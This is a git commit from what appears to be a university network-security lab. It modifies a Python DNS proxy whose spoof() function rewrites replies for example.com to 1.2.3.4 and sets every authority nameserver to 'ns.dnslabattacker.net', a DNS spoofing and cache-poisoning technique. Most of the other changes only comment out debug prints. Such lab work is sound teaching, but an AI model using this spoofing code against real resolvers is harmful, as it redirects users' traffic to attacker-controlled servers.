928626c74db488c220f3fc207fcdfea9a6d4b43b
zandent <simon.zhao@mail.utoronto.ca>
2021-04-07 00:13:14 -0400

    update part3

--- lab4/dnsproxy_starter.py
+++ lab4/dnsproxy_starter.py
@@ -24,10 +24,11 @@ def spoof(pkt):
 	if pkt[DNSQR].qname == 'example.com.':	
 		pkt[DNSRR].rdata = '1.2.3.4'
 		qname = pkt[DNSQR].qname
-		pkt[DNS].nscount = 1
-		pkt[DNS].ns[DNSRR].rdata = 'ns.dnslabattacker.net'
-		pkt[DNS].arcount=0
-		pkt[DNS].ar=None
+		#pkt[DNS].nscount = 1
+		for i in range(pkt[DNS].nscount):
+			pkt[DNS].ns[DNSRR][i].rdata = 'ns.dnslabattacker.net'
+		#pkt[DNS].arcount=0
+		#pkt[DNS].ar=None
 	return pkt
 
 def client(data):
@@ -36,23 +37,23 @@ def client(data):
 	server_address = (DNS_SERVER_IP, dns_port)
 	try:
 	    # Send data
-	    print >>sys.stderr, 'sending "%s"' % data
+	    # print >>sys.stderr, 'sending "%s"' % data
 	    sent = sock_to_dns.sendto(data, server_address)
 	    # Receive response
-	    print >>sys.stderr, 'waiting to receive'
+	    # print >>sys.stderr, 'waiting to receive'
 	    datarecv, server = sock_to_dns.recvfrom(4096)
 	    # print >>sys.stderr, 'received "%s"' % datarecv
-	    print >>sys.stderr, 'received %s bytes' % len(datarecv)
-	    DNS(datarecv).show2()
+	    # print >>sys.stderr, 'received %s bytes' % len(datarecv)
+	    # DNS(datarecv).show2()
 	    if SPOOF:
 	        data_spoof = spoof(DNS(datarecv))
 	    else:
 		data_spoof = DNS(datarecv)
 	    #data_spoof.show2()
 	finally:
-	    print >>sys.stderr, 'closing socket'
+	    # print >>sys.stderr, 'closing socket'
 	    sock_to_dns.close()
-	data_spoof.show2()
+	# data_spoof.show2()
 	return bytes(data_spoof)
 
 def server():
@@ -60,14 +61,14 @@ def server():
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	# Bind the socket to the port
 	server_address = (DNS_SERVER_IP, port)
-	print >>sys.stderr, 'starting up on %s port %s' % server_address
+	# print >>sys.stderr, 'starting up on %s port %s' % server_address
 	sock.bind(server_address)
-        print >>sys.stderr, 'waiting to receive message'
+        # print >>sys.stderr, 'waiting to receive message'
         data, address = sock.recvfrom(4096)
-        print >>sys.stderr, 'received %s bytes from %s' % (len(data), address)
+        # print >>sys.stderr, 'received %s bytes from %s' % (len(data), address)
         data_back = client(data)
         sent = sock.sendto(data_back, address)
-        print >>sys.stderr, 'sent %s bytes back to %s' % (sent, address)
+        # print >>sys.stderr, 'sent %s bytes back to %s' % (sent, address)
 
 server()
 
